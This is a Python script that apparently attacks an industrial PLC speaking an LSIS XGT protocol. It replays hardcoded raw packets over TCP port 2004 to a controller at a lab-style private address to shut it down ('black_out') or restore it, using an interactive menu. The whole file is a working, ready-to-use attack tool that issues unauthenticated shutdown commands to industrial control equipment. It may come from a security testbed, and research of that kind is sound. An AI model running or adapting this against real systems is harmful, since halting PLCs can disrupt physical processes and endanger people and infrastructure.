from socket import *
import binascii
import scapy.all as scapy
import time

recover_packet = "4c5349532d584754000000000033bbaa1100000458000000000001000400254d5831010001"
shutdown_packet = "4c5349532d584754000000000033bbaa1100000458000000000001000400254d5832010001"

HMI_IP = "192.168.1.2"
HMI_MAC = "00:0b:29:76:f7:7a"

PLC_IP = "192.168.1.4"  # TargetM_IP
PLC_Port = 2004
PLC_MAC = "00:0b:29:7a:c8:d0"

def send_packet(p):
    clientSocket = socket(AF_INET,SOCK_STREAM)
    clientSocket.connect((PLC_IP, PLC_Port))

    clientSocket.send(p)
    time.sleep(0.1)
    clientSocket.close()
    
def black_out():
    p = binascii.unhexlify(shutdown_packet)
    send_packet(p)
    
def recover():
    p = binascii.unhexlify(recover_packet)
    send_packet(p)
    
if __name__ == '__main__':
    # black_out()
    # recover()
    while True:
    	num = input("Blackout (1) or Recover (2):\n")
    	if int(num) == 1:
    		black_out()
    	elif int(num) == 2:
    		recover()
    	else:
    		break
